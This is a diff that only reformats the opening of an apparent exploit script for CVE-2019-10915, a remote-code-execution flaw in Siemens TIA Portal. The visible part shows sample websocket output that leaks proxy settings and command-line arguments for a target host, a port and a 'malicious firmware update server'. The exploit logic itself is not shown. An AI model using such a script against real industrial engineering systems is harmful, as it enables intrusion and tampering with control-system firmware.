@@ -11,20 +11,23 @@
 
 ##
 # Example usage
-# $ python cve_2019_10915_tia_portal_rce.py 
+# $ python cve_2019_10915_tia_portal_rce.py
 # Received '0{"sid":"ZF_W8SDLY3SCGExV9QZc1Z9-","upgrades":[],"pingInterval":25000,"pingTimeout":60000}'
 # Received '40'
 # Received '42[" ",{"configType":{"key":"ProxyConfigType","defaultValue":0,"value":0},"proxyAddress":{"key":"ProxyAddress","defaultValue":"","value":""},"proxyPort":{"key":"ProxyPort","defaultValue":"","value":""},"userName":{"key":"ProxyUsername","defaultValue":"","value":""},"password":{"key":"ProxyPassword","defaultValue":"","value":""}},null]'
 ##
 
-import websocket, ssl, argparse
+import argparse
+import ssl
+
+import websocket
 
 parser = argparse.ArgumentParser()
-parser.add_argument("target_host", help="TIA Portal host") 
-parser.add_argument("target_port", help="TIA Portal port (ie. 8888)", type=int) 
-parser.add_argument("update_server", help="Malicious firmware update server IP") 
+parser.add_argument("target_host", help="TIA Portal host")
+parser.add_argument("target_port", help="TIA Portal port (ie. 8888)", type=int)
+parser.add_argument("update_server", help="Malicious firmware update server IP")
 args = parser.parse_args()
-  
+
 host = args.target_host
 port = args.target_port
 updatesrv = args.update_server
